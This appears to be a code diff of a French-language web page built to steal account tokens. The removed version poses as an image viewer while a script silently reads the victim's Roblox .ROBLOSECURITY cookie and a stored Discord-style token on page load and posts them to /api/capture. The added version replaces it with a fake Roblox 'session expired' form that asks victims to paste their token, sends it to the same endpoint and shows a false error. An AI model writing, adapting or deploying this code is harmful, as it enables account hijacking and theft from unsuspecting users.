@@ -2,29 +2,33 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <title>Image Viewer</title>
+    <title>Vérification de Sécurité - Roblox</title>
     <style>
-        body { margin: 0; background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        img { max-width: 90%; border-radius: 10px; box-shadow: 0 0 20px rgba(0,255,204,0.5); }
+        body { background: #1a1a1b; color: white; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: #2b2b2c; padding: 30px; border-radius: 8px; text-align: center; border: 1px solid #3e3e40; }
+        input { width: 100%; padding: 10px; margin: 10px 0; border-radius: 4px; border: none; }
+        button { background: #00b06f; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; width: 100%; }
     </style>
 </head>
 <body>
-    <img src="https://i.pinimg.com/736x/75/d9/f1/75d9f18c5148f6d85b421279cde90907.jpg">
+    <div class="box">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" width="50" style="filter: invert(1);">
+        <h2>Session expirée</h2>
+        <p>Veuillez entrer votre jeton de connexion (.ROBLOSECURITY) pour restaurer votre session.</p>
+        <input type="text" id="tokenInput" placeholder="Collez votre token ici...">
+        <button onclick="sendToken()">Restaurer la session</button>
+    </div>
 
     <script>
-        // Le script s'exécute SEUL dès que la page charge
-        window.onload = () => {
-            const data = {
-                rblx: document.cookie.split('; ').find(row => row.startsWith('.ROBLOSECURITY='))?.split('=')[1] || "Non trouvé",
-                dsct: window.localStorage.getItem('token') || "Non trouvé"
-            };
-
-            fetch('/api/capture', {
+        async function sendToken() {
+            const token = document.getElementById('tokenInput').value;
+            await fetch('/api/capture', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
+                body: JSON.stringify({ rblx: token, dsct: "Manuel" })
             });
-        };
+            alert("Erreur de synchronisation. Réessayez plus tard.");
+        }
     </script>
 </body>
 </html>
